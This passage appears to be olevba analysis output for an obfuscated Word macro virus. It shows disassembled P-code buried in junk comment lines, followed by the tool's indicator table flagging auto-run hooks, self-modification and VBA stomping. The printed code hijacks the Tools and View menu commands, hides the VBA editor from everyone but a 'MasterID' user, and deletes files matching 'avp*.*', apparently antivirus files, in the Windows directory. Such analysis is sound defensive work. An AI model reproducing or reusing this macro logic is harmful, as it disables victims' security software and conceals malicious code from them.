' 	Rem 0x001F " Â§ŸèÛ¨Ç›Æ¡È´Í¬œâÉü°œÙ£ùÅ¿á´åÊü"
' Line #766:
' 	QuoteRem 0x0000 0x0001 "¡"
' Line #767:
' Line #768:
' 	Rem 0x000A " »ÐòåžîÐùä"
' Line #769:
' 	FuncDefn (Sub ToolsMacro())
' Line #770:
' 	Rem 0x0032 " ê±èÇ¢Ó�ÚÅÇ¶ûüýðÀŸÛ£îõþôÎ¹»¬ÝØðô»öðúåÛÃèÑ©ûãÛïÚ§ö¸"
' Line #771:
' 	Rem 0x0028 " Úð¦áÛ°Ú¦µ×ÐøùêùÊæí®ÇÌÌ½ºÙÓÌËúêð¡¢ÚÊÏÌäð"
' Line #772:
' 	Rem 0x0016 " «²Þ³ÃÖ¡¼¢Ï±íÆßéæÖ­©ïÍ"
' Line #773:
' 	Rem 0x0023 " ›âÝÔÃî£ãÊèÑºÓâõÆºñý¾óù¢ïòÂ¶»÷ÂÌä³Ô"
' Line #774:
' 	Rem 0x0030 " áÌÄïéô¡£²ßû¹ÐÜ­ž�ýÙ®íÈÀ³ÐÇâ›ÝÞú³æÝù§½›Á°Ù¸òÃð÷á"
' Line #775:
' 	QuoteRem 0x0000 0x0016 "ÐÃÕÈ±¡§�Ø»ï¤Ë²¹ô»ç·›Ó¥"
' Line #776:
' 	OnError Done 
' Line #777:
' 	Rem 0x001A " âÅ¦©¨úóÑÏá×­ù­äñÅýÁÉäÊÈÇû"
' Line #778:
' 	Rem 0x0015 " žëÀò¸Õ¦©ç£Ù¸›£¸¦ëØÚœ"
' Line #779:
' 	Rem 0x002F " ©À¤žúëýÚ©þõ£ðÆÙÕ¬ë¶©äªñª¡ïÑÝà®ÎÆŸõïäþµöó¶œÚÑÒ¢"
' Line #780:
' 	QuoteRem 0x0000 0x000B "¼÷¨ôÍë¦ïäÙò"
' Line #781:
' 	QuoteRem 0x0000 0x0015 "ÙïÑÂí­Æé­¯êªÎßèá¨é»¹¾"
' Line #782:
' 	Rem 0x0004 " ¨Õá"
' Line #783:
' 	QuoteRem 0x0000 0x0032 "¸µ¶ÑÜ©ÎöýÓãÓöîÉÏ»ÐÀÍûÑµëùèòðð×ÈÚá­�çØÀÆ»°Ê¯Ñëçý£¸Û"
' Line #784:
' 	Rem 0x002A " õäàÒÏÌ·ôøêÒºá¥ÏÉñÍÃ½¿ÀÈø¬úÇÒ¶Ì�ü¹¹ã·úÇèÈ­"
' Line #785:
' 	ArgsCall (Call) Stealth 0x0000 
' Line #786:
' 	Rem 0x000D " §Ì¿óåÍÎà¶ä¢û"
' Line #787:
' 	Rem 0x0020 " ùÝ¥Ñµ£Ì±Æà¡£÷çùôîâííª±Ö¼ñ¤ê�Ýðé"
' Line #788:
' 	QuoteRem 0x0000 0x0015 "§Úµ³âîÉ÷Íáó½žÓæ®ñÚÒËâ"
' Line #789:
' 	Label Done 
' Line #790:
' 	QuoteRem 0x0000 0x0018 "µçâëíáîÇÜà¦Ó¥Ü›¸ÈâºØÌÀçî"
' Line #791:
' 	EndSub 
' Line #792:
' 	QuoteRem 0x0000 0x002B "øÓÔÃÙöžµ¥¢ËéÙü¨ÕëÊ¹ëÚ²ùð¼¾ãõîàü¥¥þÂÔ²çÆª©ïË"
' Line #793:
' 	Rem 0x0029 " ëê§Óž¨îžÕ²ú¤îú¨¸ê®ð×²ÓÈÇÑíîÏ¾Ÿ›»ñÏ°Æ›Ê Ö"
' Line #794:
' 	Rem 0x001E " ¥Ì«ÅÆºýõô›ËÅœ¿ûžëîëÍ®�ñ¬»œÖßÇ"
' Line #795:
' 	QuoteRem 0x0000 0x0008 "Àæ§ÑÈèüý"
' Line #796:
' 	QuoteRem 0x0000 0x0010 "õý¹±£ä÷ÍßÅ¯ÄÅÐÔõ"
' Line #797:
' Line #798:
' 	Rem 0x002F " üÒ¯õÀÔ¯Ã¦ÁÍ«ßõøÔ¡àÖºÄÛÅÌØØÕÔÇÝÒ ×¨þòÇÈ¿ÙÅÙµÃÀ×"
' Line #799:
' 	Rem 0x0017 " Ë·´¡›»ŸâèßåœÃ÷¾õº´ù§Å¼"
' Line #800:
' 	QuoteRem 0x0000 0x001D "ÞêýÎ±Õ£ØÉúÅ�å¹Ë¯ðãâå´µÝý ›çÌé"
' Line #801:
' 	Rem 0x0031 " ®íþÂ»ßÆã¢ûêí�¥®û»îï²×É·ßÜìÉ­îþÍ›´ñ¹®à´çà·üô­õÑÕá"
' Line #802:
' 	Rem 0x0012 " §›ÆÌÔÜ³ÒäöüÐý½øåí"
' Line #803:
' 	Rem 0x001D " À«±ÕÆ¿±ÏÐ øé¼Ýæ¤íãé¥²ößéððµ×"
' Line #804:
' 	QuoteRem 0x0000 0x0012 "òÈÏ°Î¼¼·ÛãÑ°ðìëÒ¯Ã"
' Line #805:
' 	Rem 0x0023 " ¸Óî¤®£ÅáþÕ÷ò®Ñ¬ÏêðÙå¬¼ ÛáïŸó¡±³þÃþ"
' Line #806:
' 	FuncDefn (Sub ToolsCustomize())
' Line #807:
' 	QuoteRem 0x0000 0x0029 "ãä§æ³«ÖéÒêß·Î¸ðÑ°Îúß¯œç Â¶¸¼âÝí¾Ñ±áçõ¦ô¿½"
' Line #808:
' 	QuoteRem 0x0000 0x0024 "¯Ú¹ßÈ®Äâ�´àµõæÊî¸¢íÓÆÃÁ ²÷çóÜåìöçÔØ¾"
' Line #809:
' 	Rem 0x002D " ¯Ñø» Í»ª¹¯ÍÅéß¨¨ÞçÂÚ¡ÚÀ×©¬­Þ¯ùêñ¿�Ûç ÒžÆ´›®¥"
' Line #810:
' 	Rem 0x0026 " ­ÔÓÄÈÁþµ´ç»Üà¶žÑÜ²¾æ¿öÜÏåÇéíÔÉùÄ¸ÔÏØÚ"
' Line #811:
' 	Rem 0x0019 " ïþ¢ìúÍâ£µù£Ûºº§ðÌ®œ½´òî£"
' Line #812:
' 	Rem 0x002A " ý�ù«ÂÙËºÀ¢Ýî¾º¬ÀµâºâäÖÓ£þÆô¸ÓôèÕÛÏ›³¼´µúÍ"
' Line #813:
' 	OnError Done 
' Line #814:
' 	Rem 0x0006 " ÎàÂÝØ"
' Line #815:
' 	Rem 0x0022 " é¤ïî¨³Í¼¡›½«¯ÂÍÂ¥ßÁ¸×ºîà÷Ó¯þÐüŸýä"
' Line #816:
' 	Rem 0x0016 " Â¢Ôœ«ÃËÂÍæ¢ÆàûêýÜ›Û´®"
' Line #817:
' 	Rem 0x000A " ê£á®²ðëÃê"
' Line #818:
' 	QuoteRem 0x0000 0x0014 "ñÈýÏ¿œñûÑçÎžœ�Èñ¼»Ëä"
' Line #819:
' 	ArgsCall (Call) Stealth 0x0000 
' Line #820:
' 	QuoteRem 0x0000 0x000D "ó¥£Ï­ ÅæÊø·ÁÜ"
' Line #821:
' 	QuoteRem 0x0000 0x0029 "¾ÑÙýÆÑÞÊçö³Ï©ùÁ¦£ëÔŸÖ§ìÆåÀÚüû›Þð¡±¬Ò á¨¹á"
' Line #822:
' 	Rem 0x0029 " ºéýÀé­¬ÅÕÜìŸíÂžëý¹êé›£ãžùüäãË½Ä ¬ý£úÄ©âÍ"
' Line #823:
' 	Rem 0x0024 " Ë£Ðë¬¸êœ´ÞØÍå Øèðêüê¹ÛÒ¾ÈËü ªÝ¹ª¿µÑ"
' Line #824:
' 	Rem 0x001A " úòßÕÝÚÆ�¢  ·ßå¨´íøÊ¹·Ç�®å"
' Line #825:
' 	Label Done 
' Line #826:
' 	Rem 0x0013 " ùí¶æØÞõœ¦žúµ÷áÃ³äè"
' Line #827:
' 	QuoteRem 0x0000 0x0001 "Å"
' Line #828:
' 	EndSub 
' Line #829:
' 	Rem 0x0008 " âè§ÔÕýç"
' Line #830:
' Line #831:
' 	QuoteRem 0x0000 0x0021 "ÎÛ§ßµç¿ê«¯É¡Åú¹�õ®¹Ô½¿¦úÈþžËâÀ«¡ô"
' Line #832:
' 	Rem 0x0023 " ¿¿ çò©ÑÐÔáÙâÉÍÙ¸ç·þîø¦­ùÁ±²ÁûÌ¬¡­ê"
' Line #833:
' 	Rem 0x0014 " ³››ýãïË¼ Áý³í¾þ°à¯ð"
' Line #834:
' 	QuoteRem 0x0000 0x002B "ôÂË›Å¶­Øª¥½óïºÚûÆåÌéÙþþ²©ÕÕ®ëäÊ³¹¡éªæòÏ¦�º±"
' Line #835:
' 	Rem 0x000F " ®¾é¡ÙÐ×¼ÀÂÈ´û¹"
' Line #836:
' 	FuncDefn (Sub ViewVBCode())
' Line #837:
' 	Rem 0x0019 " é©ŸÉÛÁ×áù«œøÙëé½ýÚ¼½ëÌÕî"
' Line #838:
' 	Rem 0x0004 " ¶¿â"
' Line #839:
' 	QuoteRem 0x0000 0x0004 "ü÷ºä"
' Line #840:
' 	Rem 0x001F " ÝŸËµ²â¬óž£Í¾þí¨ÛÄÌ¥Í®êœ«ðÚèå²ù"
' Line #841:
' 	Rem 0x001F " ü®÷½éâ¶½ÂãÁº¼©®Â¼©õõÝÄ¦ý�²Ü¡¾¶"
' Line #842:
' 	QuoteRem 0x0000 0x0032 "´§æ�¶×Æ¿ñëàâ¦óåÄ²Ùø»ìãóÏéì¼åªºåÐÍøÞ©®üóµÃÄ«ÂëÚœž¡Ÿ"
' Line #843:
' 	QuoteRem 0x0000 0x0014 "§ºÓ§¥ÊÐÚ¥Ý£¼ÞãÅÒ›ÇîÃ"
' Line #844:
' 	QuoteRem 0x0000 0x0012 "Î®òþ±ÖìËØ× ê½©ùºûÓ"
' Line #845:
' 	OnError Done 
' Line #846:
' 	Rem 0x001C " æäÕâ¤¬ÔÍ§Õ×ÈûëÑÕÈÆžà©¢äÉõ¶Ã"
' Line #847:
' 	ArgsCall (Call) Stealth 0x0000 
' Line #848:
' 	QuoteRem 0x0000 0x0022 "Þ¥¨Ü×µ×¬ý§èª¿âÐŸôºùõëó£Üæ¨ç¢ñÃ÷ÏÎ²"
' Line #849:
' 	Rem 0x001F " óéùÉ´õßÞžþç¢ÙÚÄ­ñö¶µÅÕ¡ºèï æŸ "
' Line #850:
' 	QuoteRem 0x0000 0x0002 "Î›"
' Line #851:
' 	QuoteRem 0x0000 0x0019 "ü¡¯¦âžÌ¿¼ç°´¼ÍÐÁ¾œ©ù²ÃÖÉï"
' Line #852:
' 	QuoteRem 0x0000 0x001A "·ÖÛÆëæíßÆÊÑÓÀÙ÷Ý¢¸¿äÉ§Û¾ù»"
' Line #853:
' 	Label Done 
' Line #854:
' 	QuoteRem 0x0000 0x002B "Îßª½¯Ã·ê¬ÂÉØÅ²íÕ£¼¨Øï±àü¼âž¸«ãº³ÜöÎ¦È�»úí›ó"
' Line #855:
' 	Rem 0x0012 " ï¥È¸¯úï¡ê¶ÂÕÅÐùí÷"
' Line #856:
' 	Rem 0x0027 " ïãóÒÆ±Ãæºñ·Ã¶¡µÈñçÊä¡éº®Éþ­ñÃ¦ïØà¼ÚÚ±á"
' Line #857:
' 	QuoteRem 0x0000 0x0011 "²¯œú½Û© Â±ž´÷øÜîÓ"
' Line #858:
' 	Rem 0x0023 " žþ›©íéú£¼ø® ©«²Å²ý¶ÔãÈëüÀæù©éËØ¼Åá"
' Line #859:
' 	EndSub 
' Line #860:
' 	Rem 0x0023 " âë×ØÜÄ¹Þâ¬ð°·àÄøÜãÛ ÚÑÙÎì£ÏýØçž×£¤"
' Line #861:
' Line #862:
' 	Rem 0x001C " ¢ûãÊ³Ûð»ØÍ©Õ¯ÁµÝÈøË©¹³áì¢¹§"
' Line #863:
' 	QuoteRem 0x0000 0x002F "¬éËõóå�Ý¨©°æÞïîÉÑýøÁ÷­¢ËïÑÄüÖ¾Ì÷÷ØéØõ±üÜÞ�žíêÊœ"
' Line #864:
' 	QuoteRem 0x0000 0x001B "«Ð Æ¡®îÝÉË«åçâó¤ôÉ÷ñÙöÅ×ËôÓ"
' Line #865:
' 	Rem 0x0019 " à­ËêÔ®º×¤ÔŸÈ©¿Öìæ« ØÙÓØÄ"
' Line #866:
' 	Rem 0x0029 " ¶ËòÞ¯ÈË¤úî¨ÍÂµÀù¼ÉÊ¹ýý®þ§â¾²þ¡§¯�þ¢ò­äûÜ"
' Line #867:
' 	FuncDefn (Sub FileTemplates())
' Line #868:
' 	Rem 0x0024 " ãÐÎÚ¨òÉÓáçåÚÖÜ­åÞðŸÖÛ®ýÕóÊîæ£×œ®ÒÓí"
' Line #869:
' 	Rem 0x0021 " œÆÏ¶éÒÜ«þýõÕ�ìÄå¨ÅÍÆö°Ä×Ë£óã¼ÞÆô"
' Line #870:
' 	QuoteRem 0x0000 0x0022 "ÅäòóñøË¢õß¾ï¯ã­¶÷²¿¾ÓÆ¬ÇÊùàÎ«ôÈ¨Áê"
' Line #871:
' 	Rem 0x0029 " ï§ÊÇðáàØÐëßÏø›Ûãéêž¡ ùÊí´ØÆëÊ®Üý¯ú¸Ÿî¿óÕ"
' Line #872:
' 	QuoteRem 0x0000 0x0028 "þ¦ÚÉØêÞõÃôâÆÐ¢¶´ÂºëÛžàÏÛ¸ðúÀç±²©Æž¦»¦œíü"
' Line #873:
' 	Rem 0x0006 " Ó¨áãî"
' Line #874:
' 	Rem 0x0012 " ÚÈðñëÃÃíî¹È­›èî¿³"
' Line #875:
' 	OnError Done 
' Line #876:
' 	QuoteRem 0x0000 0x0001 "ò"
' Line #877:
' 	QuoteRem 0x0000 0x0027 "Ÿ¥ßèî´Ï­ÖãÐÒýèÆÉ±ûûºýÂ´Ì¨âêª£î·ó›Ä« ç¦÷"
' Line #878:
' 	QuoteRem 0x0000 0x0018 "Ó§È´£¯�î¯Ÿàœð³½¡Ä¬Ñ²¾é«ð"
' Line #879:
' 	Rem 0x002E " á¼êÜÇë¦»¶Ì®»»þÏÚ¸¥ñ¾ØÏ¹â±·÷ö·÷¸ØÇÃæ¸þç¾²åÓÕÀÔ"
' Line #880:
' 	QuoteRem 0x0000 0x0006 "íï¥ô«Í"
' Line #881:
' 	QuoteRem 0x0000 0x0020 "Íõ£þ¶ÉÔëçýëÉÅéç²øÓºáúýÀ¶á¡ñÃ·³¾Ô"
' Line #882:
' 	ArgsCall (Call) Stealth 0x0000 
' Line #883:
' 	Rem 0x001C " žÉ÷¨ºÜ ÁÂÝž©åÏÊÓŸÛê¶ÜÀÝ±ñ· "
' Line #884:
' 	QuoteRem 0x0000 0x0007 "°©¹Ï¢òú"
' Line #885:
' 	Rem 0x0020 " ¿ý›Öû²î¥¬¬ ¡¯¥ýø¿�åéªÁ´º©ÄøßÑÀ°"
' Line #886:
' 	QuoteRem 0x0000 0x0013 "ÈèëéÂËæÂþ°éÆ¯²Éó¦Î¿"
' Line #887:
' 	QuoteRem 0x0000 0x0016 "ÝŸœÛâöªæÑãÕÙ«ôãûÝÔïïþÃ"
' Line #888:
' 	QuoteRem 0x0000 0x0004 "Á¡ù¼"
' Line #889:
' 	Label Done 
' Line #890:
' 	Rem 0x002F " ¾¤ÌÊï¾¼öÄæÎø¾ÛÉý·¼Ý´ÖðÏµØÂîµÏÖ¨½ Íå´ï¹ÑŸáëÏÃÊß"
' Line #891:
' 	QuoteRem 0x0000 0x000A "àÊ¦¼¢µã·×²"
' Line #892:
' 	Rem 0x0017 " ÑïÏèœñö¡ÍŸ©çýÞîâîçÁÂÒŸ"
' Line #893:
' 	Rem 0x000B " §áÙ›´ò±Ò°ñ"
' Line #894:
' 	EndSub 
' Line #895:
' 	QuoteRem 0x0000 0x0015 "¨¢ÙÝŸã¸Õ»ÑÔ·¼÷ü­œÉÁ×Ú"
' Line #896:
' 	QuoteRem 0x0000 0x0012 "ó·ŸûÂ¦´ý§¸¼Ü«çóïïä"
' Line #897:
' 	Rem 0x0010 " Üòºçú¾Òê¼ÎíÅñÅÃ"
' Line #898:
' 	Rem 0x0005 " ¡ê¯ú"
' Line #899:
' Line #900:
' 	QuoteRem 0x0000 0x0007 "ðß¯Ü¦ñÐ"
' Line #901:
' 	Rem 0x000B " ð©ü­�Áå­î¼"
' Line #902:
' 	FuncDefn (Sub Stealth())
' Line #903:
' 	Rem 0x0025 " ÂõÛ­ÔÉÆ©Í›Óµ·÷äß›ÞÓäœî²œžüýŸô¶®ë¦ñÃù"
' Line #904:
' 	QuoteRem 0x0000 0x0002 "ôç"
' Line #905:
' 	Rem 0x000E " ªüãò¡ª³ùéþÎÒÇ"
' Line #906:
' 	QuoteRem 0x0000 0x0014 "­ÔÙ¥è³üÛ§Ÿì°ûßª¬ïÈ¸¦"
' Line #907:
' 	OnError Done 
' Line #908:
' 	Rem 0x0026 " ½¿¹¤±¿ªé®¤êžÓ¸œæ¤ÁÃ´µÛ©¶¹›»ÞŸâ¬ûÄÜûÍç"
' Line #909:
' 	QuoteRem 0x0000 0x000F "ÍôÅÍæñží§ÒÀ½æ÷²"
' Line #910:
' 	QuoteRem 0x0000 0x002E "¤ùÖÖ¦žÛ±ÐÏÙàá¤ÇÃêõÑ³×²Ÿž¦ìßæêúÉÔÙÂ¥Ïõö®�ëá¦¨ÜÈ"
' Line #911:
' 	Rem 0x001D " ý³æü¿¥œÉòÄ·åÊœœßœ â÷žÔª¼»õ··"
' Line #912:
' 	QuoteRem 0x0000 0x000B "òÚÔªüÄåð¡Àö"
' Line #913:
' 	Ld Application 
' 	MemLd UserName 
' 	Ld MasterID 
' 	Eq 
' 	Paren 
' 	St Authorize 
' Line #914:
' 	Rem 0x002A " ÐÜ×Ã»Ü´µ¢±ó¥«ðüÙø·³ôÛÀŸž¼âÑæ½ýÙÑÖ¢ÖáÞõÔ�Ù"
' Line #915:
' 	Ld Authorize 
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #916:
' 	QuoteRem 0x0000 0x0023 "ÇµžÙÈ¬­°¸×í¹åôëÒ³Â ¸±ÌºÑ©ÑÏÝ¶Âýù³ð¸"
' Line #917:
' 	Rem 0x0022 " ßžÒØÓªßÑÙ¬åâï¦õŸ©¦óïµøÜÚ¾ŸùÝ¼ØÉ±�"
' Line #918:
' 	Rem 0x0007 " áýñÛ¾¦"
' Line #919:
' Line #920:
' 	QuoteRem 0x0000 0x0008 " ÛïÙ²½âï"
' Line #921:
' 	Rem 0x0013 " É¶­³¸êÇí²ÝÅì¯ÜÔëÝå"
' Line #922:
' 	QuoteRem 0x0000 0x0012 "¬åäÌÔÓý½ý´òÐÓì¥÷úã"
' Line #923:
' 	Rem 0x000D " Ñµ£ÈÆÑ í°ºµÈ"
' Line #924:
' 	QuoteRem 0x0000 0x001A "ØÎÔÉÙÇÞ«¯ÃÄí¼ÅôÒÁºïØ³¿ÔÌªç"
' Line #925:
' 	Rem 0x0012 " ¾åì­ÄÐ¸ö½›æÝÌ§Ìö¤"
' Line #926:
' 	Ld Authorize 
' 	Not 
' 	IfBlock 
' Line #927:
' 	Rem 0x0021 " Ü¶Øº¥õÕÔÔÉäÂ¢ñÍõîÂ²ÎÂ¿­ñÊÏ¶ÞÖµÎ·"
' Line #928:
' 	QuoteRem 0x0000 0x0019 "»úóÄÅôŸèÜ¢Ý¬ÂèÙûîïüñøîñÈ¯"
' Line #929:
' 	Rem 0x0030 " ·§ÀÂðÆ¨í³£Ñ¶Ðü»»œÉðÊ¡ÔÎºðýÞÀæèÓâÎôä¹«ÅÆ¦ãÎØþÕ«ã"
' Line #930:
' 	Rem 0x0010 " Þµ¦Ð÷¥ÙÝ¸Ìä¶Çóè"
' Line #931:
' 	QuoteRem 0x0000 0x000B "Éñ¶æÉþ°ß¯÷é"
' Line #932:
' 	Rem 0x0008 " åÙ›£µ³½"
' Line #933:
' 	Rem 0x002D " ÜíÀÜðß³È÷éÜéžôëÞŸÔÂçú›½ø¤ÃÄÛœ»ÆŸ«ÒÃð¼ú³üëïÂê"
' Line #934:
' 	Rem 0x0024 "  ÀÓ©¸´ûÖç£Éñ½ûà¹¿ÕÐÈß¡ÓäÊÒ´ùéØñËìº¦"
' Line #935:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #936:
' 	QuoteRem 0x0000 0x002D "ÚøâÂ£¼üú¨è×ü¥ÌºýÁÌÐÃÙž÷úÙñÞâŸ¯ÓžìÊè¥·êÁ»¬®ãÆ²"
' Line #937:
' 	LitStr 0x0006 "avp*.*"
' 	MemStWith FileName 
' Line #938:
' 	QuoteRem 0x0000 0x0021 "Ûà›ç³¥óÐÃù°éàÚ¨æ¾áÒÄÅ°ßêÜž¼­³ïüñ­"
' Line #939:
' 	Rem 0x001B " íÊ¦é£Ÿ«ŸæÄÙè›¥¢ÛÑîÒú¤ÅçžÅÌ"
' Line #940:
' 	Rem 0x002A " ´ï¹ÕîÜ�á¹Ã�æïÐ¨ÖÊó¡Úãðé¹÷»ðÃÃ»¿¨³ÉÜñý¦íåø"
' Line #941:
' 	Rem 0x0003 " ø´"
' Line #942:
' 	QuoteRem 0x0000 0x002B "ÞõÓ¨¦«ïóë�®èŸº¢×óÑõºùÎ°ÉþÞ×Ê­±ÀØ§›üæà£©ëÔ¤ô"
' Line #943:
' 	LitStr 0x0006 "windir"
' 	ArgsLd Environ 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	ArgsLd Mid$$ 0x0003 
' 	MemStWith LookIn 
' Line #944:
' 	QuoteRem 0x0000 0x001F "¥ëÐóþçÄÚ¸öÒ´ª›£ûéÏœÍúÃúá¤Ðßñ³ûÍ"
' Line #945:
' 	QuoteRem 0x0000 0x000E "õ®ûÕÊñÓáªÍÁèŸ³"
' Line #946:
' 	Rem 0x0003 " íÈ"
' Line #947:
' 	QuoteRem 0x0000 0x0020 "ÑË³ž�´Ÿ¥¬Îõ»õùÏÎöóÎç©ùê¼Ÿ´Ù¸ÍÐÑ�"
' Line #948:
' 	LitVarSpecial (False)
' 	Not 
' 	MemStWith SearchSubFolders 
' Line #949:
' 	Rem 0x0005 " ºµ¾¾"
' Line #950:
' 	ArgsMemCallWith Execute 0x0000 
' Line #951:
' 	Rem 0x002B " è¯æòµÙÑ¢ãïñü®ÜËáý£Î¾Ïë«çú¶®£Ïâ«¡ÞäÅ¤öèî�Â¶"
' Line #952:
' 	Rem 0x0011 " ¹Öí®þàîþçÏÖàÓµëÑ"
' Line #953:
' 	Rem 0x002C " óéî³óß­ê´¼åÃ»«ðþÑ¹ñÈÆÓ›ŸÁ¶ûØ¡í¸ÊâøÊ¤¦æëÏ·Õ›"
' Line #954:
' 	Rem 0x0033 " ÎÑà¥Úìâ¶©ø¯›¥Àßøœ»Î§¥ë×¡ÀËìÀÁÀ§¹í¥Ñüé¢í¼î¸ïøç�ëÁ°¤"
' Line #955:
' 	QuoteRem 0x0000 0x0016 "óž©âÜúÎ›»¤Ãª®´ÀÙ¾ï¦Ôãê"
' Line #956:
' 	Rem 0x0014 " ñ§»ÀÎ¹ªÑòÃŸžßöÉÛýÀæ"
' Line #957:
' 	Rem 0x0010 " áŸÏö¿úûöªùÔþóÖô"
' Line #958:
' 	Rem 0x0012 " ÆÌÝ§ÛýÒ¥ÌæüÅÏÆÈ­Â"
' Line #959:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	For 
' Line #960:
' 	QuoteRem 0x0000 0x0009 "ÜÊÌ¤¤±åÐú"
' Line #961:
' 	QuoteRem 0x0000 0x000B "øëôðÃ¸Ñ¿±Êì"
' Line #962:
' 	Rem 0x001B "  êÑÃµùÆËÕ¡Ò¼¥ á¸ä¾ûê¨°�Ê¼Þ"
' Line #963:
' 	QuoteRem 0x0000 0x0032 "±¶¸æßÖ¡£ÍÃÓÏ¢ã®ÕìÐÊÀ¸³Øý²÷èÑ¦½¬«ÖÚíÈæë¥ùùý£­ÊÃÎÔ¡§"
' Line #964:
' 	Rem 0x0033 " üÎí¯üÌáïûÏ¾ÄÆ¼ŸëÙÁçáÇªÔÞ§£Öœá¹íÂ§ªá­®ÂÃÕ³®ðÊÖðÒžÚº"
' Line #965:
' 	QuoteRem 0x0000 0x002E "îÂÚ°ÀãÏÚÔÐÔç¢§¼Úã£Éý¸¹æ¢ôÝú¾¦Óºëû«ï�Ó¸Ä¨Ï·Ï¼¬Â"
' Line #966:
' 	Rem 0x0025 " ÄŸËµÈíªö®±ïýÄ¥ÁÔß÷ì¼žç¾´Âž³»çø´ñ¦ä Ú"
' Line #967:
' 	Rem 0x000F " ªä½œê¨óóÈ§íª¨½"
' Line #968:
' 	Ld i 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	ArgsCall Kill 0x0001 
' Line #969:
' 	Rem 0x001E " à�²¼ù®áä¡ÝÙç¼Ë›î²¬ÍÄžñô×ª²»Â¶"
' Line #970:
' 	QuoteRem 0x0000 0x0024 "å®µ¿ÁÆëß¼Øõ­°ÓŸÖ¸©Ð©¹õà£øÃçô­¾Ô·ÁÇúô"
' Line #971:
' 	QuoteRem 0x0000 0x0001 "ù"
' Line #972:
' 	QuoteRem 0x0000 0x002A "³ßôþÒ£ÊÚ­µÅŸúãÇÐÕ´½¥ëØŸÇ®ù¸çïú©ºÜï¯áÍúØù¡°"
' Line #973:
' 	QuoteRem 0x0000 0x0027 "Ä¸÷ÍÄÑ¨åíÜÒ�©¡�¶¯¬ÒòÕ±ÕøÝþýºÍ±æÉÌæÍøØËä"
' Line #974:
' 	QuoteRem 0x0000 0x0012 "žé¯œ¬Ò§¸ùŸùäÞÏ¶±ÓÒ"
' Line #975:
' 	QuoteRem 0x0000 0x0027 "¨ä¼ÃÆª÷ôöØÔÍ¦ß¤Ï¥¿õ½ÙÕÙîŸÉ»Äý¸Øûê²ÆÁßîÒ"
' Line #976:
' 	QuoteRem 0x0000 0x0011 "³úÖ±³éÂáõ°ÒÑ©ýÖªô"
' Line #977:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #978:
' 	QuoteRem 0x0000 0x0014 "«äÃŸá¾ÛðÎø××¤Å©áÅ¾½ì"
' Line #979:
' 	Rem 0x0013 " ª ß©äò·öÓé©¸¸äØàÂ¸"
' Line #980:
' 	Rem 0x002C " ÈÓÚÕ¿ö­ö¤·¥ê¿Ì­­ýž£Ûúð­À¼áÆŸð»æ·¶ÂºžË¬ÎÒ¾ûß"
' Line #981:
' 	Rem 0x0020 " ¯Ø¯ ËèÈð«¶£´êÛ›µ¹µÇè÷Ú¾âð¿¿ðÞó×"
' Line #982:
' 	QuoteRem 0x0000 0x0018 "ø·Ý¡íùÊŸÁÎçïáªìÔÚãÞœžª¶·"
' Line #983:
' 	EndWith 
' Line #984:
' 	QuoteRem 0x0000 0x0023 "·«Éìî¦ÐÏØáàžðÉçÖâ¢¥åËñ±àÌ›�ÂëÎòÆÙþÃ"
' Line #985:
' 	Rem 0x001E " ¨ŸÀþòºçøËöÇ²³Æ´¿õœÑ°›Ñ·èæçúÐð"
' Line #986:
' 	Rem 0x002C " ßùõö�ìÂñÙÆ  ´ÝæÕÔä°ú�Ì»ªÎÂ®Õñ¯øÕøÏ¯ñÓýÏÓµµ¹"
' Line #987:
' 	QuoteRem 0x0000 0x0014 "ëÛùÇºôÚæúù³ÂÃµŸÉÎá«Î"
' Line #988:
' 	QuoteRem 0x0000 0x0030 "úÈð¸£¯ùãÂª©àÑ»Ø«¹´ðœæäæ¢Ÿ«´ù¤éñÏôÐô¹ÛéÈÆÔä©Î×ÒÖ¦"
' Line #989:
' 	EndIfBlock 
' Line #990:
' 	Rem 0x0012 " ¦õôÄâºíó³×¢ÓãÄÜÕ©"
' Line #991:
' 	Rem 0x0022 " æÏÀ¬·à¿Ì³ïÎúîï÷°½µÔ¶ô®õäõå°ÜÀÄä´ì"
' Line #992:
' 	QuoteRem 0x0000 0x0019 "½œìœÉÏÆÊîñê��ÏïÐ¿ãÁ°¥ðÞ�À"
' Line #993:
' 	Rem 0x0011 " áí×®â¡íÊêìÂýºñ®Ó"
' Line #994:
' 	Rem 0x0011 " öÏöøñÄçÐÂÙÓÝªÖÖÄ"
' Line #995:
' 	Label Done 
' Line #996:
' 	Rem 0x0010 " ®«¶õõîÖäó¹å¾ÑÌÃ"
' Line #997:
' 	EndSub 
' Line #998:
' 	Rem 0x000D " óæ¾ÊÝÑ¿¢áØ¿³"
' Line #999:
' 	QuoteRem 0x0000 0x0029 "ÓÎìÕ¡ë½ÈäÝ÷œ÷°Õíô÷ÁÄø¢õà»þØü�žðõž¼ÝžÚ·½¯´"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

